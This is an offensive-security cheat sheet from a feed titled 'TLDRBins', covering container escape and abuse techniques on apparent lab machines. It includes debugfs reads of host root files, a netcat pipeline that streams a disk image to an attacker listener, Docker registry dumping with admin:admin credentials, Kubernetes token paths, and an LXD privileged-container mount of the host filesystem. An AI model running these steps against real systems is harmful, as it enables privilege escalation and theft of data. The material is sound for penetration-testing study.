channel.title: Container on TLDRBins
channel.description: Recent content in Container on TLDRBins

item.title: Disk Group
item.description:
General

# Show devices
lsblk

$ lsblk
NAME                   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda                      8:0    0   12G  0 disk 
├─sda1                   8:1    0  120M  0 part /boot
├─sda2                   8:2    0    1K  0 part 
└─sda5                   8:5    0 11.9G  0 part 
  ├─Kotarak--vg-root   252:0    0    7G  0 lvm  /
  └─Kotarak--vg-swap_1 252:1    0    1G  0 lvm  [SWAP]
sr0                     11:0    1 1024M  0 rom

# Device attributes
blkid

$ blkid
/dev/sda1: UUID="67e178a9-1b2a-407e-8d3f-7b1772bab2be" TYPE="ext2" PARTUUID="1b9f3540-01"
/dev/sda5: UUID="LnUYcF-uZX0-c91G-XfUl-6BqJ-gk8W-QtnncD" TYPE="LVM2_member" PARTUUID="1b9f3540-05"
/dev/mapper/Kotarak--vg-root: UUID="efb44a28-8edc-4d40-aca3-81e57d58d759" TYPE="ext4"
/dev/mapper/Kotarak--vg-swap_1: UUID="162b2913-7dcf-4ba7-bddc-238a22f16e52" TYPE="swap"

# Show device mapping
ls -l /dev/mapper/

$ ls -l /dev/mapper/
total 0
crw------- 1 root root 10, 236 Sep 22 23:22 control
lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-root -> ../dm-0
lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-swap_1 -> ../dm-1

# Show swap on blk
swapon -s

$ swapon -s
Filename                                Type            Size    Used    Priority
/dev/dm-1                               partition       1048572 0       -1

# Filesystem info
cat /etc/fstab

$ cat /etc/fstab
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
/dev/mapper/Kotarak--vg-root /               ext4    errors=remount-ro 0       1
# /boot was on /dev/sda1 during installation
UUID=67e178a9-1b2a-407e-8d3f-7b1772bab2be /boot           ext2    defaults        0       2
/dev/mapper/Kotarak--vg-swap_1 none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0

Abuse #1: Read Host’s Filesystem from Container (root)

1. Open Target Device

debugfs /dev/sda1

$ debugfs /dev/sda1
debugfs 1.44.1 (24-Mar-2018)

# Read
ls -l /root

   2456   40750 (2)      0      0    4096 23-Sep-2024 06:49 .
      2   40755 (2)      0      0    4096 24-Nov-2023 10:10 ..
   2457  100600 (1)      0      0    3121 27-Nov-2017 22:45 .bashrc
   2458  100600 (1)      0      0     148 17-Aug-2015 18:30 .profile
  50878   40700 (2)      0      0    4096 13-Sep-2022 18:51 .cache
  50115  100400 (1)      0      0      33 23-Sep-2024 06:49 root.txt
 131982   40755 (2)      0      0    4096 24-Nov-2023 09:41 .nano
  56604   40755 (2)      0      0    4096 13-Sep-2022 18:51 .ssh
  30962  120777 (7)      0      0       9 13-Sep-2022 18:36 .bash_history

(END)

Abuse #2: Read Container’s Filesystem from Host

1. Show LVM Mappings

ls -l /dev/mapper/

$ ls -l /dev/mapper/
total 0
crw------- 1 root root 10, 236 Sep 22 23:22 control
lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-root -> ../dm-0
lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-swap_1 -> ../dm-1

2. Exfil Container’s Filesystem

# In our local machine
nc -lvnp <LOCAL_PORT> > <DEVICE_MAPPING>.gz

$ nc -lvnp 4444 > dm-0.gz
listening on [any] 4444 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 35450

# Target container rootfs, e.g. dm-0
dd if=/dev/<DEVICE_MAPPING> | gzip -1 - | nc <LOCAL_IP> <LOCAL_PORT>

$ dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.31 4444
14680064+0 records in
14680064+0 records out
7516192768 bytes (7.5 GB, 7.0 GiB) copied, 306.697 s, 24.5 MB/s

3. Mount Locally

# Extract dm-0
gunzip <DEVICE_MAPPING>.gz

$ gunzip dm-0.gz

# Mount the filesystem
sudo mount <DEVICE_MAPPING> /mnt/ 

$ sudo mount dm-0 /mnt/

# Read
ls /mnt/root/

$ ls /mnt/root/
app.log  flag.txt

Note: can take a long time to transfer

item.title: Docker
item.description:
General

# Show all running docker processes
sudo docker ps -a

# Show all docker images
sudo docker images -a

# Stop all docker [processes
sudo docker stop $(sudo docker ps -a -q)

# Remove all docker processes
sudo docker rm -vf $(sudo docker ps -a -q)

# Remove all docker images
sudo docker rmi -f $(sudo docker images -aq)

# Shell in container
sudo docker exec -it <CONTAINER_ID> bash

# Privileged shell in container
sudo docker exec -it --privileged --user root <CONTAINER_ID> bash

# Copy file from host to container
sudo docker cp <HOST_FILE_PATH> <CONTAINER_ID>:<CONTAINER_FILE_PATH>

# Copy file from container to host
sudo docker cp <CONTAINER_ID>:<CONTAINER_FILE_PATH> <HOST_FILE_PATH>

# Copy folder from host to container
sudo docker cp <HOST_FOLDER_PATH>/. <CONTAINER_ID>:<CONTAINER_TARGET_PATH>

# Copy folder from container to host
sudo docker cp <CONTAINER_ID>:<CONTAINER_FOLDER_PATH>/. <HOST_TARGET_PATH>

Explore Docker Image

dive docker-archive://image.tar

Ref: dive

item.title: Docker Registry
item.description:
Docker Registry API

# List repos
curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/_catalog

$ curl -s -k --user "admin:admin" https://docker.registry.htb/v2/_catalog
{"repositories":["bolt-image"]}

# List of tags of this repo
curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/<REPO_NAME>/tags/list

$ curl -s -k --user "admin:admin" https://docker.registry.htb/v2/bolt-image/tags/list
{"name":"bolt-image","tags":["latest"]}

# List manifest file for this tag (e.g. latest)
curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/<REPO_NAME>/manifests/<TAG>

$ curl -s -k --user "admin:admin" https://docker.registry.htb/v2/bolt-image/manifests/latest
{
   "schemaVersion": 1,
   "name": "bolt-image",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"
      },
      {
         "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"
      },
      {
         "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"
      },
      ---[SNIP]---
}

# Get a commit of the image
curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/<REPO_NAME>/blobs/sha256:<BLOB_HASH> > <BLOB_HASH>.tar.gz

$ curl -s -k --user "admin:admin" https://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b > 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar.gz

Docker Registry Dump

# List repos
python3 drg.py <TARGET> -p <PORT> -U '<USER>' -P '<PASSWORD>' --list

$ python3 drg.py https://docker.registry.htb -p 443 -U 'admin' -P 'admin' --list
[+] bolt-image

# Dump repo
python3 drg.py <TARGET> -p <PORT> -U '<USER>' -P '<PASSWORD>' --dump <REPO_NAME>

$ python3 drg.py https://docker.registry.htb -p 443 -U 'admin' -P 'admin' --dump bolt-image
[+] BlobSum found 10
[+] Dumping bolt-image
    [+] Downloading : 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b
    [+] Downloading : 3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee
    [+] Downloading : 02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c
    [+] Downloading : c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7
---[SNIP]---

Ref: DockerRegistryGrabber

item.title: Kubelet
item.description:
General

# List all the pods on the node
kubeletctl pods -s <TARGET>

# List running pods
kubeletctl runningpods -s <TARGET>

# Exec command
kubeletctl exec "/bin/bash" -p <POD_NAME> -c <CONTAINER_NAME> -s <TARGET>

Ref: kubeletctl

item.title: Kubernetes
item.description:
Token Location

/run/secrets/kubernetes.io/serviceaccount/token

Certificate Location

/run/secrets/kubernetes.io/serviceaccount/ca.crt

General

# List all namespaces
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get namespaces

# Get user permissions in current namespace
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> auth can-i --list

# Get user permissions in specific namespace
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> auth can-i --list -n <NAMESPACE>

# List all pods
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get pods --all-namespaces

# List pods in specific namespace
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get pods -n <NAMESPACE>

# Get YAML of a pod
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get pod <POD_NAME> -o yaml

# Get info of a pod
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> describe pod <POD_NAME> -n <NAMESPACE>

# List secrets
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get secrets -n <NAMESPACE>

# Get info of a secret
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> describe secret <SECRET_NAME> -n <NAMESPACE>

Ref: kubectl

item.title: Lxd
item.description:
General

# Check if user in lxd group
id

orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)

# List containers
lxc list

orestis@brainfuck:~$ lxc list
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+

# List images
lxc image list

orestis@brainfuck:~$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+

Abuse #1: Mount host’s File System

# Upload a 656 bytes conatiner image
echo  | base64 -d > test.tar.bz2

orestis@brainfuck:~$ echo  | base64 -d > test.tar.bz2

# Import image
lxc image import test.tar.bz2 --alias testImage

orestis@brainfuck:~$ lxc image import test.tar.bz2 --alias testImage
Image imported with fingerprint: 8961bb8704bc3fd43269c88f8103cab4fccd55325dd45f98e3ec7c75e501051d

# Check image
lxc image list

orestis@brainfuck:~$ lxc image list
+-----------+--------------+--------+-------------+--------+--------+------------------------------+
|   ALIAS   | FINGERPRINT  | PUBLIC | DESCRIPTION |  ARCH  |  SIZE  |         UPLOAD DATE          |
+-----------+--------------+--------+-------------+--------+--------+------------------------------+
| testImage | 8961bb8704bc | no     |             | x86_64 | 0.00MB | Sep 24, 2024 at 8:26am (UTC) |
+-----------+--------------+--------+-------------+--------+--------+------------------------------+

# Init VM
lxc init testImage testVM -c security.privileged=true

orestis@brainfuck:~$ lxc init testImage testVM -c security.privileged=true
Creating testVM

# Mount the host /
lxc config device add testVM realRoot disk source=/ path=r

orestis@brainfuck:~$ lxc config device add testVM realRoot disk source=/ path=r
Device realRoot added to testVM

# Start VM
lxc start testVM

orestis@brainfuck:~$ lxc start testVM

# Check containers
lxc list

orestis@brainfuck:~$ lxc list
+--------+---------+------+------+------------+-----------+
|  NAME  |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+--------+---------+------+------+------------+-----------+
| testVM | RUNNING |      |      | PERSISTENT | 0         |
+--------+---------+------+------+------------+-----------+

# Execute as root inside container
lxc exec testVM -- /bin/bash

orestis@brainfuck:~$ lxc exec testVM -- /bin/bash
bash-4.3# 

# We have full access on host disk thru /r/
ls -la /r/root

bash-4.3# ls -la /r/root
total 32
drwx------  4 root root 4096 Oct  3  2022 .
drwxr-xr-x 23 root root 4096 Sep 15  2022 ..
lrwxrwxrwx  1 root root    9 Sep 15  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 May  5  2017 .cache
-rw-------  1 root root   66 Oct  3  2022 .mysql_history
drwxr-xr-x  2 root root 4096 Oct  3  2022 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Apr 29  2017 root.txt

Build Image for Other Arch

git clone git clone https://github.com/saghul/lxd-alpine-builder

cd lxd-alpine-builder      

# For example arch i686
sudo ./build-alpine -a i686
